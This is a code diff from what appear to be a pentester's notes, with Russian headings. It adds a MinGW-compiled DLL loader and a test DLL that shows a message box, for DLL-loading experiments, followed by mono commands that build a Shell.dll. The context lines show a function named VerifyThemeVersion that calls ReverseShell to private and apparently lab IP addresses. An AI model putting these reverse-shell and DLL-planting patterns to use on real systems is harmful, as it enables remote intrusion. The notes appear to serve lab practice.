@@ -66,11 +66,81 @@ void VerifyThemeVersion() {
         ReverseShell("192.168.50.123", 9001);
 //        ReverseShell("10.10.14.20", 9001);
 }
+-----------------------------------------Вызывалка----------------------
+
+x86_64-w64-mingw32-gcc-win32 test.c  -o test.exe
+    --------------------------------
+#include <windows.h>
+#include <stdio.h>
+
+int main( void )
+{
+        HINSTANCE hDll;
+
+        // Load Dll
+        hDll = LoadLibrary(TEXT("max.dll"));
+
+        // If Dll Was Loaded
+        if (hDll != NULL){
+                printf("DLL Found\n");
+                } else {
+                printf("DLL Not Found");
+                }
+        return 0;
+}
+
+----------------------------------------------------ДЛЛКА
+
+x86_64-w64-mingw32-gcc-win32 max.c  -o test.dll -shared
+
+   ------------------------------------------
+
+#include <windows.h>
+
+BOOL WINAPI
+DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
+{
+        switch (dwReason)
+        {
+         case DLL_PROCESS_ATTACH:
+          MessageBox(NULL,
+                        "dsfvsdfsd",
+                        "dsvsdvs",
+                        MB_ICONERROR | MB_OK);
+        break;
+        }
+return TRUE;
+}
+
+
+
+                
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 -----------------------------------------
-
-
 # Компиляция C# из линукс
 
 sudo apt install mono-devel
 
 mcs -target:library -out:Shell.dll Shell.cs
+
